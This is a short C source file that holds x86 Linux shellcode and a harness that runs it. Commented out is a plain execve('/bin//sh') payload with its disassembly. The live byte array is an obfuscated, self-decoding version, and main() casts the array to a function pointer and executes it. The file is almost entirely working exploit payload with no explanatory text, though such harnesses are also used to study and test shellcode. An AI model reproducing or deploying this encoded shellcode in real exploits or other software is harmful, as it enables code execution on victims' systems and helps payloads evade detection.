#include <stdio.h>
char sh1[] = 
// "\x6a\x0b"                      /* push   0xb */
// "\x58"                          /* pop    eax */
// "\x31\xf6"                      /* xor    esi,esi */
// "\x56"                          /* push   esi */
// "\x68\x2f\x2f\x73\x68"          /* push   0x68732f2f */
// "\x68\x2f\x62\x69\x6e"          /* push   0x6e69622f */
// "\x89\xe3"                      /* mov    ebx,esp */
// "\x31\xc9"                      /* xor    ecx,ecx */
// "\x89\xca"                      /* mov    edx,ecx */
// "\xcd\x80";                      /* int    0x80 */

"\xEB\x30\x5A\x31"
"\xDB\xB3\x18\x8B"
"\x0A\x81\xE9\xB6"
"\xBB\xFE\xFE\x81"
"\xF1\x6C\xAC\x47"
"\x0B\x81\xC1\x17"
"\xEF\xDA\x52\xC1"
"\xC1\x02\x81\xC1"
"\xBD\x7B\x8D\x56"
"\x89\x0A\x42\x42"
"\x42\x42\x4B\x4B"
"\x4B\x4B\x74\x07"
"\xEB\xD5\xE8\xCB"
"\xFF\xFF\xFF\x6E"
"\xD4\x8E\x27\x91"
"\x27\x1B\x27\x5F"
"\x1E\xDB\x39\x9F"
"\x62\x5A\x37\x66"
"\x42\x88\xC1\xA6"
"\x44\xF1\xBB";

int main(int argc, char **argv)
{
	void (*func)();
	func = (void (*)()) sh1;
	(void)(*func)();
	return 0;
}
